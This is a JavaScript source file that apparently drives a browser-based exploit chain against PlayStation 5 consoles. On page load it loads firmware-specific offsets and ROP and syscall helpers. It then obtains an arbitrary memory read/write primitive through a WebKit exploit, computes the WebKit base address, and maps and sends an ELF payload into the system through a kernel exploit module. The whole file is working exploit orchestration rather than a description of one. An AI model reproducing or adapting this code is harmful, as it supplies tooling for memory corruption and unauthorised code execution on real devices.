import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";
import { main } from "./main.js";
import { sendElf, mapElf } from "./kexp.js";

let STRINGS = {
  events: {
    PROC_INIT: {
      text: "installing system check...",
      status: "warning",
      indicator: "INSTALLING",
    },
  },
  states: {
    INSTALLING: {
      text: "INSTALLING",
      status: "warning",
    },
  },
};

const isInstaller = !!document.querySelector(
  'meta[name="type"][content="installer"]',
);
const dot = document.querySelector(".dot");
const indicator = document.querySelector("#indicator");
const tag = document.querySelector("#consoleTag");
const logEl = document.querySelector("pre");

const INSTALLER = {
  fileUrl: "payloads/sce-hell0.elf",
  fileName: "sce-hell0.elf",
};

export const loadScript = (src) =>
  new Promise((resolve, reject) => {
    const s = document.createElement("script");
    s.src = src;
    s.onload = resolve;
    s.onerror = reject;
    document.head.appendChild(s);
  });

class FirmwareError extends Error {
  constructor(code, detail) {
    super(detail || code);
    this.code = code;
  }
}

function format(template, params = {}) {
  return template.replace(/\{(\w+)\}/g, (match, key) =>
    key in params ? params[key] : match,
  );
}

export function log(key, params = {}, status) {
  const now = new Date();
  const timestamp = now.toLocaleString().replace(", ", " ").split(" ")[1];

  const colors = {
    info: "var(--accent)",
    warning: "var(--warn)",
    success: "var(--succ)",
    error: "var(--err)",
    faint: "var(--fg-faint)",
    dim: "var(--fg-dim)",
  };

  const statusToClass = {
    success: "succ",
    warning: "warn",
    error: "err",
    info: "idle",
  };

  const entry = STRINGS.events?.[key];
  const template = entry ? entry.text : key;
  const finalStatus = status ?? entry?.status ?? "info";
  const msg = format(template, params);

  logEl.innerHTML += `&nbsp;&nbsp;<span style="color: ${colors.faint}">${timestamp}</span> <span style="color: ${colors.dim}">»</span> <span style="color: ${colors[finalStatus] || colors.info}">${msg}</span>\n`;
  logEl.scrollTop = logEl.scrollHeight;

  if (entry?.indicator) {
    const stateEntry = STRINGS.states?.[entry.indicator];
    if (stateEntry) {
      dot.classList.remove("ok", "warn", "err", "idle");
      tag.classList.remove("ok", "warn", "err", "idle");
      dot.classList.add(statusToClass[stateEntry.status] || "err");
      tag.classList.add(statusToClass[stateEntry.status] || "err");
      indicator.textContent = stateEntry.text;
      tag.textContent = stateEntry.text;
    }
  }
}

async function loadStrings(url) {
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    STRINGS = await response.json();
  } catch (error) {
    console.error("Failed to load strings:", error);
  }
}

export async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export async function fetchWithTimeout(url, ms = 500, options = {}) {
  if (ms <= 0) return fetch(url);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  const fetchOptions = { ...options, signal: controller.signal };
  return fetch(url, fetchOptions).finally(() => clearTimeout(timer));
}

export async function fetchWithRetry(url, maxRetries = 15, retryDelay = 500) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetchWithTimeout(url, 3000);
      return response;
    } catch (e) {
      const isNetworkError =
        e.message.includes("Load failed") ||
        e.message.includes("Failed to fetch") ||
        e.name === "TypeError";

      if (isNetworkError && i < maxRetries - 1) {
        console.log(
          `[RETRY] TCP is busy, attempting to retry (${i + 1}/${maxRetries}): ${url}`,
        );
        await sleep(retryDelay);
      } else {
        throw e;
      }
    }
  }
}

async function checkFileExists(fileUrl) {
  const fileName = fileUrl.split("/").pop();
  try {
    const response = await fetchWithTimeout(fileUrl, 3000, {
      method: "GET",
    });
    const contentType = response.headers.get("Content-Type");
    if (
      response.ok &&
      contentType &&
      contentType.includes("application/octet-stream")
    ) {
      log("PL_FOUND", { file: fileName });
      return true;
    }
  } catch (error) {
    log("PL_ERR_LOAD", { file: fileName, err: error.message });
    return false;
  }
}

function checkFirmwareOnLoad() {
  try {
    if (typeof window.firmware === "undefined") {
      throw new FirmwareError("SYS_MISS");
    }

    const rejectMsg = window.firmware.rejection();
    if (rejectMsg) {
      throw new FirmwareError("SYS_FAIL", rejectMsg);
    }

    log("SYS_OK", { fw: window.fw_str || "UNKNOWN" });
    return true;
  } catch (e) {
    const code = e instanceof FirmwareError ? e.code : "ERR_FATAL";
    log(code, { err: e.message, msg: e.message });
    return false;
  }
}

async function getPrimitive() {
  log("WEBKIT_START");
  const primitive = installWindowP(await establishPrimitive());
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  log("ARW ready");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;

  if (
    typeof ctor !== "number" ||
    typeof OFFSET_wk_host_constructor_candidates === "undefined"
  )
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

async function run() {
  try {
    const installerExists = await checkFileExists(INSTALLER.fileUrl);
    if (!installerExists) {
      log("PL_ERR_LOAD", {
        file: INSTALLER.fileName,
        err: "File not found",
      });
      return false;
    }

    await loadScript(`offsets/${window.fw_str}.js`);
    await loadScript("js/rop.js");
    await loadScript("js/utils/syscalls.js");
    await import("./relapse_exploit.js");
    log("CREDITS");
    log(`Agent: ${navigator.userAgent}`);
    log(`Firmware: ${window.fw_str}`);
    const primitive = await getPrimitive();
    log(`WebKit base: 0x${getWebKitBase().toString(16)}`);

    const result = await main(primitive);
    log("PL_SENT", { file: INSTALLER.fileName });
    log("PL_LOAD", { file: INSTALLER.fileName });
    const MAP = await mapElf(INSTALLER.fileUrl, result.p, result.chain);
    await sendElf(INSTALLER.fileName, MAP, result.p, result.chain);
    log("PL_DONE");

    return true;
  } catch (error) {
    log(error instanceof Error ? error.message : String(error), {}, "error");
    return false;
  }
}

document.addEventListener("DOMContentLoaded", () => {
  loadStrings("json/strings.json").then(async () => {
    await loadScript("js/firmware.js");
    const fwValid = checkFirmwareOnLoad();

    if (!fwValid) {
      return;
    }

    if (isInstaller) {
      return;
    }

    await run();
  });
});

log("PROC_INIT");
